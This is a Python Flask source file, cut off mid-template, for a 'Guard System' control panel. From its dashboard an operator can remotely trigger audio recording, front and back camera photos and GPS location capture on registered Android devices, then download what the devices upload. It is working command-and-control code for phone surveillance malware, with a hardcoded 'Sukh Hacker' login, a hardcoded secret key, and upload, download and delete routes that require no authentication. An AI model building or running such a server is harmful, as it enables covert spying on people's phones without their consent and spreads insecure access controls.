import os
import logging
from flask import Flask, request, render_template_string, send_file, redirect, url_for, session, jsonify
from werkzeug.utils import secure_filename
from threading import Thread
import time
import json

# Initialize Flask app
app = Flask(__name__)
app.secret_key = 'your-secret-key-change-in-production-12345'
app.config['UPLOAD_FOLDER'] = 'recordings'
app.config['DEVICE_FOLDER'] = 'devices'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024

# Ensure upload and device directories exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['DEVICE_FOLDER'], exist_ok=True)

# Global variables
device_signals = {}
USERNAME = "Sukh Hacker"
PASSWORD = "sukhbir44@007"

# Device management functions
def get_device_file_path(device_id):
    return os.path.join(app.config['DEVICE_FOLDER'], f"{device_id}.json")

def load_device_data(device_id):
    device_file = get_device_file_path(device_id)
    if os.path.exists(device_file):
        try:
            with open(device_file, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_device_data(device_id, data):
    device_file = get_device_file_path(device_id)
    with open(device_file, 'w') as f:
        json.dump(data, f)

def get_all_devices():
    devices = []
    try:
        for filename in os.listdir(app.config['DEVICE_FOLDER']):
            if filename.endswith('.json'):
                device_id = filename[:-5]
                device_data = load_device_data(device_id)
                devices.append({
                    'id': device_id,
                    'name': device_data.get('name', 'Unknown Device'),
                    'model': device_data.get('model', 'Unknown Model'),
                    'last_seen': device_data.get('last_seen', 0),
                    'status': device_data.get('status', 'offline')
                })
    except FileNotFoundError:
        os.makedirs(app.config['DEVICE_FOLDER'], exist_ok=True)
    
    devices.sort(key=lambda x: x['last_seen'], reverse=True)
    return devices

# ============ BASIC ROUTES ============

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('devices'))
        return render_template_string(LOGIN_HTML, error='Invalid credentials')
    return render_template_string(LOGIN_HTML)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/devices')
def devices():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    all_devices = get_all_devices()
    current_time = time.time()
    for device in all_devices:
        if current_time - device['last_seen'] > 60:
            device['status'] = 'offline'
    
    return render_template_string(DEVICES_HTML, devices=all_devices)

# ============ DEVICE REGISTRATION & HEARTBEAT ============

@app.route('/register-device', methods=['POST'])
def register_device():
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        device_name = data.get('device_name', 'Unknown Device')
        device_model = data.get('device_model', 'Unknown Model')
        
        if not device_id:
            return jsonify({'ok': False, 'error': 'Device ID required'}), 400
        
        device_data = load_device_data(device_id)
        device_data.update({
            'name': device_name,
            'model': device_model,
            'last_seen': time.time(),
            'status': 'online'
        })
        
        save_device_data(device_id, device_data)
        
        print(f"✅ Device registered: {device_name} ({device_model}) - ID: {device_id}")
        return jsonify({'ok': True, 'message': 'Device registered successfully'})
        
    except Exception as e:
        print(f"❌ Device registration error: {e}")
        return jsonify({'ok': False, 'error': 'Device registration failed'}), 500

@app.route('/device-heartbeat', methods=['POST'])
def device_heartbeat():
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'ok': False, 'error': 'Device ID required'}), 400
        
        device_data = load_device_data(device_id)
        device_data['last_seen'] = time.time()
        device_data['status'] = 'online'
        save_device_data(device_id, device_data)
        
        return jsonify({'ok': True})
        
    except Exception as e:
        print(f"❌ Device heartbeat error: {e}")
        return jsonify({'ok': False, 'error': 'Heartbeat failed'}), 500

# ============ DEVICE DASHBOARD ============

@app.route('/device/<device_id>')
def device_dashboard(device_id):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    device_data = load_device_data(device_id)
    if not device_data:
        return "Device not found", 404
    
    # List files for this device
    files = []
    photos = []
    location_files = []
    
    upload_dir = app.config['UPLOAD_FOLDER']
    try:
        for filename in os.listdir(upload_dir):
            filepath = os.path.join(upload_dir, filename)
            
            if filename.startswith(f"{device_id}_"):
                file_info = {
                    'name': filename,
                    'size': os.path.getsize(filepath),
                    'modified': os.path.getmtime(filepath)
                }
                
                if filename.endswith(('.m4a', '.mp3', '.wav', '.mp4')):
                    files.append(file_info)
                elif filename.lower().endswith(('.jpg', '.jpeg', '.png')):
                    photos.append(file_info)
                elif filename.startswith(f"{device_id}_location_") and filename.endswith('.txt'):
                    location_files.append(file_info)
                    
    except FileNotFoundError:
        os.makedirs(upload_dir, exist_ok=True)
    
    files.sort(key=lambda x: x['modified'], reverse=True)
    photos.sort(key=lambda x: x['modified'], reverse=True)
    location_files.sort(key=lambda x: x['modified'], reverse=True)
    
    return render_template_string(DEVICE_DASHBOARD_HTML, 
                                 device=device_data, 
                                 device_id=device_id,
                                 files=files, 
                                 photos=photos[:6],
                                 location_files=location_files[:5])

# ============ BASIC CONTROLS ============

@app.route('/device/<device_id>/start-recording', methods=['POST'])
def start_device_recording(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    if device_id not in device_signals:
        device_signals[device_id] = {}
    
    device_signals[device_id]['recording'] = True
    
    record_time = 15
    if request.is_json:
        data = request.get_json()
        record_time = data.get('record_time', 15)
    
    print(f"Recording signal activated for device {device_id} - {record_time} seconds")
    return jsonify({'ok': True, 'message': f'Recording signal sent to {device_id} - {record_time}s', 'record_time': record_time})

@app.route('/device/<device_id>/check-signal')
def check_device_signal(device_id):
    recording_signal = device_signals.get(device_id, {}).get('recording', False)
    return jsonify({'record': recording_signal})

@app.route('/device/<device_id>/signal-received', methods=['POST'])
def device_signal_received(device_id):
    if device_id in device_signals:
        device_signals[device_id]['recording'] = False
    return jsonify({'ok': True})

# Camera controls
@app.route('/device/<device_id>/start-camera-signal', methods=['POST'])
def start_device_camera_signal(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    data = request.get_json()
    camera_type = data.get('camera_type', 'front')
    
    if device_id not in device_signals:
        device_signals[device_id] = {}
    
    device_signals[device_id]['camera'] = {
        'active': True,
        'camera_type': camera_type,
        'timestamp': time.time()
    }
    
    print(f"Camera signal activated for device {device_id} - {camera_type} camera")
    return jsonify({'ok': True, 'message': f'{camera_type} camera signal sent to {device_id}'})

@app.route('/device/<device_id>/check-camera-signal')
def check_device_camera_signals(device_id):
    camera_signal = device_signals.get(device_id, {}).get('camera', {})
    
    if camera_signal and camera_signal.get('active'):
        if time.time() - camera_signal.get('timestamp', 0) < 30:
            return jsonify({
                'capture': True,
                'camera_type': camera_signal.get('camera_type', 'front')
            })
    
    if device_id in device_signals:
        device_signals[device_id]['camera'] = {'active': False}
    
    return jsonify({'capture': False})

@app.route('/device/<device_id>/camera-signal-received', methods=['POST'])
def device_camera_signal_received(device_id):
    if device_id in device_signals:
        device_signals[device_id]['camera'] = {'active': False}
    return jsonify({'ok': True})

# Location controls
@app.route('/device/<device_id>/start-location-signal', methods=['POST'])
def start_device_location_signal(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    if device_id not in device_signals:
        device_signals[device_id] = {}
    
    device_signals[device_id]['location'] = {
        'active': True,
        'timestamp': time.time()
    }
    
    print(f"Location signal activated for device {device_id}")
    return jsonify({'ok': True, 'message': f'Location signal sent to {device_id}'})

@app.route('/device/<device_id>/check-location-signal')
def check_device_location_signal(device_id):
    location_signal = device_signals.get(device_id, {}).get('location', {})
    
    if location_signal and location_signal.get('active'):
        if time.time() - location_signal.get('timestamp', 0) < 30:
            return jsonify({'get_location': True})
    
    if device_id in device_signals:
        device_signals[device_id]['location'] = {'active': False}
    
    return jsonify({'get_location': False})

@app.route('/device/<device_id>/location-signal-received', methods=['POST'])
def device_location_signal_received(device_id):
    if device_id in device_signals:
        device_signals[device_id]['location'] = {'active': False}
    return jsonify({'ok': True})

# ============ FILE UPLOADS ============

@app.route('/device/<device_id>/upload-photo', methods=['POST'])
def upload_device_photo(device_id):
    print(f"📸 Upload photo endpoint called for device {device_id}")
    
    if 'photo' not in request.files:
        print("❌ No photo file in request")
        return jsonify({'ok': False, 'error': 'No photo file'}), 400
    
    photo_file = request.files['photo']
    
    if photo_file.filename == '':
        print("❌ Empty filename")
        return jsonify({'ok': False, 'error': 'No file selected'}), 400
    
    if photo_file:
        timestamp = str(int(time.time()))
        filename = f"{device_id}_camera_photo_{timestamp}.jpg"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        try:
            photo_file.save(filepath)
            file_size = os.path.getsize(filepath)
            print(f"✅ Photo saved for device {device_id}: {filename} ({file_size} bytes)")
            
            return jsonify({'ok': True, 'message': 'Photo uploaded', 'filename': filename})
        except Exception as e:
            print(f"❌ File save error: {e}")
            return jsonify({'ok': False, 'error': f'File save failed: {e}'}), 500
    
    return jsonify({'ok': False, 'error': 'Upload failed'}), 500

@app.route('/device/<device_id>/upload-location', methods=['POST'])
def upload_device_location(device_id):
    print(f"📍 Upload location endpoint called for device {device_id}")
    
    try:
        data = request.get_json()
        print(f"📍 Location data received for device {device_id}:", data)
        
        if not data:
            return jsonify({'ok': False, 'error': 'No location data'}), 400
        
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        accuracy = data.get('accuracy')
        address = data.get('address', 'Unknown address')
        
        if latitude and longitude:
            timestamp = str(int(time.time()))
            filename = f"{device_id}_location_{timestamp}.txt"
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            
            location_info = f"""Location Captured - Device: {device_id}
Timestamp: {time.ctime()}
Latitude: {latitude}
Longitude: {longitude}
Accuracy: {accuracy} meters
Address: {address}

Google Maps: https://maps.google.com/?q={latitude},{longitude}
"""
            
            with open(filepath, 'w') as f:
                f.write(location_info)
            
            print(f"✅ Location saved for device {device_id}: {filename}")
            return jsonify({'ok': True, 'message': 'Location received', 'filename': filename})
        else:
            return jsonify({'ok': False, 'error': 'Invalid location data'}), 400
            
    except Exception as e:
        print(f"❌ Location upload error for device {device_id}: {e}")
        return jsonify({'ok': False, 'error': f'Location save failed: {e}'}), 500

@app.route('/mobile-upload', methods=['POST'])
def mobile_upload():
    try:
        device_id = "default_device"
        print(f"Files received: {list(request.files.keys())}")
        
        audio_file = None
        if 'file' in request.files:
            audio_file = request.files['file']
            print("Using 'file' field")
        elif 'audio' in request.files:
            audio_file = request.files['audio']
            print("Using 'audio' field")
        
        if not audio_file or audio_file.filename == '':
            return jsonify({'ok': False, 'error': 'No file selected'}), 400
        
        timestamp = str(int(time.time()))
        filename = f"{device_id}_android_recording_{timestamp}.m4a"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        audio_file.save(filepath)
        
        print(f"✅ Mobile recording uploaded: {filename} ({os.path.getsize(filepath)} bytes)")
        return jsonify({'ok': True, 'message': 'Upload successful', 'filename': filename})
    
    except Exception as e:
        print(f"❌ Upload error: {e}")
        return jsonify({'ok': False, 'error': 'Upload failed'}), 500

# ============ FILE DOWNLOADS ============

@app.route('/files/<filename>')
def download_file(filename):
    try:
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if os.path.exists(filepath):
            return send_file(filepath, as_attachment=True)
        else:
            return "File not found", 404
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/delete-file/<filename>', methods=['POST'])
def delete_file(filename):
    try:
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if os.path.exists(filepath):
            os.remove(filepath)
            return jsonify({'ok': True, 'message': 'File deleted'})
        else:
            return jsonify({'ok': False, 'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500

# ============ TEMPLATES ============

LOGIN_HTML = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚀 Guard System - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%); color: #ffffff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .login-container { background: rgba(25, 25, 25, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 40px; width: 100%; max-width: 400px; box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5); }
        .login-header { text-align: center; margin-bottom: 30px; }
        .login-header h1 { color: #00b7ff; font-size: 2.5rem; font-weight: 700; text-shadow: 0 0 20px rgba(0, 183, 255, 0.5); margin-bottom: 10px; }
        .login-header p { color: #888; font-size: 1rem; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; color: #00b7ff; margin-bottom: 8px; font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; }
        .form-group input { width: 100%; background: rgba(255, 255, 255, 0.05); border: 2px solid rgba(255, 255, 255, 0.1); border-radius: 10px; color: #fff; padding: 15px; font-size: 1rem; transition: all 0.3s ease; }
        .form-group input:focus { outline: none; border-color: #00b7ff; box-shadow: 0 0 20px rgba(0, 183, 255, 0.3); }
        .login-btn { width: 100%; padding: 15px; border: none; border-radius: 10px; background: linear-gradient(135deg, #00b7ff 0%, #0099cc 100%); color: white; font-size: 1rem; font-weight: 600; cursor: pointer; transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 1px; }
        .login-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(0, 183, 255, 0.4); }
        .error-message { color: #ff4444; text-align: center; margin-top: 15px; font-size: 0.9rem; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>🚀 GUARD SYSTEM</h1>
            <p>Secure Access Portal</p>
        </div>
        <form method="POST">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">🔐 Login</button>
            {% if error %}
            <div class="error-message">{{ error }}</div>
            {% endif %}
        </form>
    </div>
</body>
</html>
"""

DEVICES_HTML = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚀 Guard System - Devices</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%); color: #ffffff; min-height: 100vh; overflow-x: hidden; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        header { background: rgba(25, 25, 25, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 25px 30px; margin-bottom: 25px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5); }
        .header-left h1 { color: #00b7ff; font-size: 2.2rem; font-weight: 700; text-shadow: 0 0 20px rgba(0, 183, 255, 0.5); margin-bottom: 5px; }
        .header-left p { color: #888; font-size: 1rem; }
        .header-right { display: flex; gap: 15px; align-items: center; }
        .btn { padding: 12px 25px; border: none; border-radius: 12px; font-size: 0.95rem; font-weight: 600; cursor: pointer; transition: all 0.3s ease; text-decoration: none; display: inline-flex; align-items: center; gap: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
        .btn-logout { background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%); color: white; }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(0, 183, 255, 0.4); }
        .devices-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 25px; margin-top: 20px; }
        .device-card { background: rgba(25, 25, 25, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 25px; transition: all 0.3s ease; cursor: pointer; position: relative; overflow: hidden; }
        .device-card:hover { transform: translateY(-5px); box-shadow: 0 15px 30px rgba(0, 183, 255, 0.3); border-color: #00b7ff; }
        .device-card.online::before { content: ''; position: absolute; top: 0; left: 0; width: 5px; height: 100%; background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%); }
        .device-card.offline::before { content: ''; position: absolute; top: 0; left: 0; width: 5px; height: 100%; background: linear-gradient(135deg, #6c757d 0%, #495057 100%); }
        .device-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 15px; }
        .device-name { color: #00b7ff; font-size: 1.4rem; font-weight: 700; margin-bottom: 5px; }
        .device-model { color: #888; font-size: 0.9rem; }
        .device-status { padding: 6px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
        .status-online { background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%); box-shadow: 0 0 15px rgba(40, 167, 69, 0.5); }
        .status-offline { background: linear-gradient(135deg, #6c757d 0%, #495057 100%); }
        .device-info { margin-top: 15px; }
        .device-info-item { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 0.9rem; }
        .info-label { color: #888; }
        .info-value { color: #ccc; }
        .device-actions { margin-top: 20px; display: flex; gap: 10px; }
        .btn-control { flex: 1; padding: 10px; border: none; border-radius: 10px; font-size: 0.85rem; font-weight: 600; cursor: pointer; transition: all 0.3s ease; text-align: center; text-decoration: none; color: white; }
        .btn-manage { background: linear-gradient(135deg, #00b7ff 0%, #0099cc 100%); }
        .empty-state { grid-column: 1 / -1; text-align: center; padding: 60px 20px; color: #666; }
        .empty-state h3 { font-size: 1.5rem; margin-bottom: 10px; color: #888; }
        .refresh-btn { background: rgba(108, 117, 125, 0.3); color: #ccc; border: 1px solid rgba(255, 255, 255, 0.1); padding: 10px 20px; border-radius: 10px; cursor: pointer; font-size: 0.9rem; margin-top: 20px; transition: all 0.3s ease; }
        .refresh-btn:hover { background: rgba(108, 117, 125, 0.5); transform: translateY(-2px); }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="header-left">
                <h1>🚀 GUARD SYSTEM</h1>
                <p>Connected Devices Management</p>
            </div>
            <div class="header-right">
                <a href="/logout" class="btn btn-logout">🚪 Logout</a>
            </div>
        </header>

        <div class="control-section">
            <div class="section-title">
                📱 Connected Devices
                <button class="refresh-btn" onclick="refreshDevices()">🔄 Refresh Devices</button>
            </div>
            
            <div class="devices-grid" id="devicesGrid">
                {% for device in devices %}
                <div class="device-card {{ 'online' if device.status == 'online' else 'offline' }}">
                    <div class="device-header">
                        <div>
                            <div class="device-name">{{ device.name }}</div>
                            <div class="device-model">{{ device.model }}</div>
                        </div>
                        <div class="device-status {{ 'status-online' if device.status == 'online' else 'status-offline' }}">
                            {{ device.status }}
                        </div>
                    </div>
                    
                    <div class="device-info">
                        <div class="device-info-item">
                            <span class="info-label">Device ID:</span>
                            <span class="info-value">{{ device.id[:8] }}...</span>
                        </div>
                        <div class="device-info-item">
                            <span class="info-label">Last Seen:</span>
                            <span class="info-value">{{ device.last_seen|int|string|truncate(10, True, '') }}</span>
                        </div>
                    </div>
                    
                    <div class="device-actions">
                        <a href="/device/{{ device.id }}" class="btn-control btn-manage">🎮 Manage Device</a>
                    </div>
                </div>
                {% endfor %}
                
                {% if devices|length == 0 %}
                <div class="empty-state">
                    <h3>📱 No Devices Connected</h3>
                    <p>Install the Guard System app on your Android devices to see them here.</p>
                </div>
                {% endif %}
            </div>
        </div>
    </div>

    <script>
        function refreshDevices() { location.reload(); }
        setInterval(refreshDevices, 30000);
    </script>
</body>
</html>
"""

DEVICE_DASHBOARD_HTML = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚀 Guard System - {{ device.name }}</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
            color: #ffffff;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Header Styles */
        header {
            background: rgba(25, 25, 25, 0.95);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 25px 30px;
            margin-bottom: 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
        }
        
        .header-left h1 {
            color: #00b7ff;
            font-size: 2.2rem;
            font-weight: 700;
            text-shadow: 0 0 20px rgba(0, 183, 255, 0.5);
            margin-bottom: 5px;
        }
        
        .header-left p {
            color: #888;
            font-size: 1rem;
        }
        
        .device-info {
            margin-top: 10px;
            font-size: 0.9rem;
            color: #ccc;
        }
        
        .header-right {
            display: flex;
            gap: 15px;
            align-items: center;
        }
        
        /* Button Styles */
        .btn {
            padding: 12px 25px;
            border: none;
            border-radius: 12px;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .btn-logout {
            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
            color: white;
        }
        
        .btn-back {
            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
            color: white;
        }
        
        .btn-recorder {
            background: linear-gradient(135deg, #00b7ff 0%, #0099cc 100%);
            color: white;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.4);
        }
        
        /* Control Sections */
        .control-section {
            background: rgba(25, 25, 25, 0.95);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 25px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
        }
        
        .section-title {
            color: #00b7ff;
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 2px solid rgba(0, 183, 255, 0.3);
            padding-bottom: 12px;
        }
        
        /* Control Groups */
        .control-group {
            margin-bottom: 20px;
        }
        
        .control-group label {
            display: block;
            color: #00b7ff;
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .control-group input {
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #fff;
            padding: 12px 15px;
            font-size: 1rem;
            width: 120px;
            transition: all 0.3s ease;
        }
        
        .control-group input:focus {
            outline: none;
            border-color: #00b7ff;
            box-shadow: 0 0 20px rgba(0, 183, 255, 0.3);
        }
        
        /* Control Buttons */
        .controls {
            display: flex;
            gap: 15px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .btn-control {
            padding: 14px 25px;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-start {
            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
            color: white;
        }
        
        .btn-stop {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
            color: white;
        }
        
        .btn-camera-front {
            background: linear-gradient(135deg, #17a2b8 0%, #138496 100%);
            color: white;
        }
        
        .btn-camera-back {
            background: linear-gradient(135deg, #6f42c1 0%, #5a2d91 100%);
            color: white;
        }
        
        .btn-location {
            background: linear-gradient(135deg, #ff6b35 0%, #e55627 100%);
            color: white;
        }
        
        /* Status Indicators */
        .signal-status {
            padding: 10px 15px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .status-active {
            background: rgba(40, 167, 69, 0.2);
            color: #28a745;
            border: 1px solid rgba(40, 167, 69, 0.5);
        }
        
        .status-inactive {
            background: rgba(108, 117, 125, 0.2);
            color: #6c757d;
            border: 1px solid rgba(108, 117, 125, 0.5);
        }
        
        /* File Lists */
        .files-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .file-card {
            background: rgba(40, 40, 40, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 20px;
            transition: all 0.3s ease;
        }
        
        .file-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.3);
            border-color: #00b7ff;
        }
        
        .file-name {
            color: #00b7ff;
            font-weight: 600;
            margin-bottom: 8px;
            word-break: break-all;
        }
        
        .file-info {
            display: flex;
            justify-content: space-between;
            color: #888;
            font-size: 0.85rem;
            margin-bottom: 12px;
        }
        
        .file-actions {
            display: flex;
            gap: 10px;
        }
        
        .btn-file {
            flex: 1;
            padding: 8px 12px;
            border: none;
            border-radius: 6px;
            font-size: 0.8rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            text-decoration: none;
            color: white;
        }
        
        .btn-download {
            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
        }
        
        .btn-delete {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
        }
        
        /* Photos Grid */
        .photos-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        
        .photo-card {
            background: rgba(40, 40, 40, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        
        .photo-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.3);
            border-color: #00b7ff;
        }
        
        .photo-img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            background: #1a1a1a;
        }
        
        .photo-info {
            padding: 12px;
        }
        
        .photo-name {
            color: #00b7ff;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 5px;
            word-break: break-all;
        }
        
        .photo-size {
            color: #888;
            font-size: 0.75rem;
        }
        
        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: #666;
        }
        
        .empty-state h4 {
            font-size: 1.2rem;
            margin-bottom: 10px;
            color: #888;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .controls {
                flex-direction: column;
                align-items: stretch;
            }
            
            .btn-control {
                justify-content: center;
            }
            
            .files-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header>
            <div class="header-left">
                <h1>🎮 {{ device.name }}</h1>
                <p>Device Control Panel</p>
                <div class="device-info">
                    Model: {{ device.model }} | ID: {{ device_id }}
                </div>
            </div>
            <div class="header-right">
                <a href="/devices" class="btn btn-back">⬅️ Back to Devices</a>
                <a href="/logout" class="btn btn-logout">🚪 Logout</a>
            </div>
        </header>

        <!-- Recording Controls -->
        <div class="control-section">
            <div class="section-title">🎤 Audio Recording Controls</div>
            
            <div class="control-group">
                <label for="recordTime">Recording Duration (seconds):</label>
                <input type="number" id="recordTime" value="15" min="5" max="300">
            </div>
            
            <div class="controls">
                <button class="btn-control btn-start" onclick="startRecording()">
                    🎤 Start Recording
                </button>
                <button class="btn-control btn-stop" onclick="stopRecording()">
                    ⏹️ Stop Recording
                </button>
                <div class="signal-status status-inactive" id="recordingStatus">
                    🔴 Recording: Inactive
                </div>
            </div>
        </div>

        <!-- Camera Controls -->
        <div class="control-section">
            <div class="section-title">📸 Camera Controls</div>
            
            <div class="controls">
                <button class="btn-control btn-camera-front" onclick="captureCamera('front')">
                    📱 Front Camera
                </button>
                <button class="btn-control btn-camera-back" onclick="captureCamera('back')">
                    📷 Back Camera
                </button>
                <div class="signal-status status-inactive" id="cameraStatus">
                    🔴 Camera: Inactive
                </div>
            </div>
        </div>

        <!-- Location Controls -->
        <div class="control-section">
            <div class="section-title">📍 Location Controls</div>
            
            <div class="controls">
                <button class="btn-control btn-location" onclick="getLocation()">
                    📍 Get Location
                </button>
                <div class="signal-status status-inactive" id="locationStatus">
                    🔴 Location: Inactive
                </div>
            </div>
        </div>

        <!-- Recordings List -->
        <div class="control-section">
            <div class="section-title">🎵 Recent Recordings</div>
            
            {% if files %}
            <div class="files-grid">
                {% for file in files %}
                <div class="file-card">
                    <div class="file-name">{{ file.name }}</div>
                    <div class="file-info">
                        <span>Size: {{ (file.size / 1024 / 1024)|round(2) }} MB</span>
                        <span>{{ file.modified|int|string|truncate(10, True, '') }}</span>
                    </div>
                    <div class="file-actions">
                        <a href="/files/{{ file.name }}" class="btn-file btn-download" download>📥 Download</a>
                        <button class="btn-file btn-delete" onclick="deleteFile('{{ file.name }}')">🗑️ Delete</button>
                    </div>
                </div>
                {% endfor %}
            </div>
            {% else %}
            <div class="empty-state">
                <h4>📭 No Recordings Found</h4>
                <p>Start recording to see files here</p>
            </div>
            {% endif %}
        </div>

        <!-- Photos List -->
        <div class="control-section">
            <div class="section-title">🖼️ Recent Photos</div>
            
            {% if photos %}
            <div class="photos-grid">
                {% for photo in photos %}
                <div class="photo-card">
